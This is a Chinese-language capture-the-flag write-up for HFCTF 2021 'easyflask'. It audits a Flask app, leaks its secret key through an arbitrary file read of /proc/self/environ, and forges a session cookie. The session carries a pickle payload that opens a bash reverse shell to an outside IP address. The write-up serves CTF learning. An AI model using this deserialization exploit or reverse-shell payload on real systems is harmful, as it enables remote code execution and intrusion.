# \[HFCTF 2021 Final]easyflask

## \[HFCTF 2021 Final]easyflask

## 考点

* Flask代码审计
* pickle反序列化

## wp

提示`/file?file=index.js`访问继续提示`Source at /app/source`，访问`/file?file=/app/source`得到源码

```python
#!/usr/bin/python3.6
import os
import pickle

from base64 import b64decode
from flask import Flask, request, render_template, session

app = Flask(__name__)
app.config["SECRET_KEY"] = "*******"

User = type('User', (object,), {
    'uname': 'test',
    'is_admin': 0,
    '__repr__': lambda o: o.uname,
})


@app.route('/', methods=('GET',))
def index_handler():
    if not session.get('u'):
        u = pickle.dumps(User())
        session['u'] = u
    return "/file?file=index.js"


@app.route('/file', methods=('GET',))
def file_handler():
    path = request.args.get('file')
    path = os.path.join('static', path)
    if not os.path.exists(path) or os.path.isdir(path) \
            or '.py' in path or '.sh' in path or '..' in path or "flag" in path:
        return 'disallowed'

    with open(path, 'r') as fp:
        content = fp.read()
    return content


@app.route('/admin', methods=('GET',))
def admin_handler():
    try:
        u = session.get('u')
        if isinstance(u, dict):
            u = b64decode(u.get('b'))
        u = pickle.loads(u)
    except Exception:
        return 'uhh?'

    if u.is_admin == 1:
        return 'welcome, admin'
    else:
        return 'who are you?'


if __name__ == '__main__':
    app.run('0.0.0.0', port=80, debug=False)
```

首先使用`type()`生成新的类型对象`User`，有2个属性`uname`和`is_admin`，1个方法`__repr__()`把对象当做字符串使用时调用。python中type()有2个用法，只有第一个参数则返回对象的类型，三个参数则会新建一个类。

```python
User = type('User', (object,), {
    'uname': 'test',
    'is_admin': 0,
    '__repr__': lambda o: o.uname,
})
```

后面的操作都和session有关，看一下session内容

```
flask-unsign.exe --decode --cookie eyJ1Ijp7IiBiIjoiZ0FTVkdBQUFBQUFBQUFDTUNGOWZiV0ZwYmw5ZmxJd0VWWE5sY3BTVGxDbUJsQzQ9In19.YqmCCQ.1BUh4xim9Ych3BP-xrO3zkglSiE
{'u': b'\x80\x04\x95\x18\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04User\x94\x93\x94)\x81\x94.'}
```

进行反序列化后是一个User对象

```python
import pickle
User = type('User', (object,), {
    'uname': 'test',
    'is_admin': 0,
    '__repr__': lambda o: o.uname,
})

u = b'\x80\x04\x95\x18\x00\x00\x00\x00\x00\x00\x00\x8c\x08__main__\x94\x8c\x04User\x94\x93\x94)\x81\x94.'

u = pickle.loads(u)
print(type(u))
print(u.__dir__())
# <class '__main__.User'>
# ['uname', 'is_admin', '__repr__', '__module__', '__dict__', '__weakref__', '__doc__', '__hash__', '__str__', '__getattribute__', '__setattr__', '__delattr__', '__lt__', '__le__', '__eq__', '__ne__', '__gt__', '__ge__', '__init__', '__new__', '__reduce_ex__', '__reduce__', '__subclasshook__', '__init_subclass__', '__format__', '__sizeof__', '__dir__', '__class__']
```

接着看源码

访问`/`会生成根据`User`类生成session，访问`/file?file=`会读取相应文件

访问`/file?file=/proc/self/environ`，得到`secret_key=glzjin22948575858jfjfjufirijidjitg3uiiuuh`

之后可以伪造session了

访问`/admin`会对session进行反序列化，结合前面的可以控制session，反序列化RCE

exp

```python
import pickle
from base64 import b64encode
import os

User = type('User', (object,), {
    'uname': 'tyskill',
    'is_admin': 0,
    '__repr__': lambda o: o.uname,
    '__reduce__': lambda o: (os.system, ("bash -c 'bash -i >& /dev/tcp/81.68.218.54/55555 0>&1'",))
})
u = pickle.dumps(User())
print(b64encode(u).decode())
# gANjcG9zaXgKc3lzdGVtCnEAWDUAAABiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGNwLzgxLjY4LjIxOC41NC81NTU1NSAwPiYxJ3EBhXECUnEDLg==
```

再重新加密

```
flask-unsign.exe --sign --cookie "{'u':{'b':'gANjcG9zaXgKc3lzdGVtCnEAWDUAAABiYXNoIC1jICdiYXNoIC1pID4mIC9kZXYvdGN wLzgxLjY4LjIxOC41NC81NTU1NSAwPiYxJ3EBhXECUnEDLg=='}}" --secret "glzjin22948575858jfjfjufirijidjitg3uiiuuh"
eyJ1Ijp7ImIiOiJnQU5qY0c5emFYZ0tjM2x6ZEdWdENuRUFXRFVBQUFCaVlYTm9JQzFqSUNkaVlYTm9JQzFwSUQ0bUlDOWtaWFl2ZEdOd0x6Z3hMalk0TGpJeE9DNDFOQzgxTlRVMU5TQXdQaVl4SjNFQmhYRUNVbkVETGc9PSJ9fQ.YqmbLg.rCX3wzAkC4R43A36IVULOtUeAoo
```

![](<../../.gitbook/assets/image (25).png>)
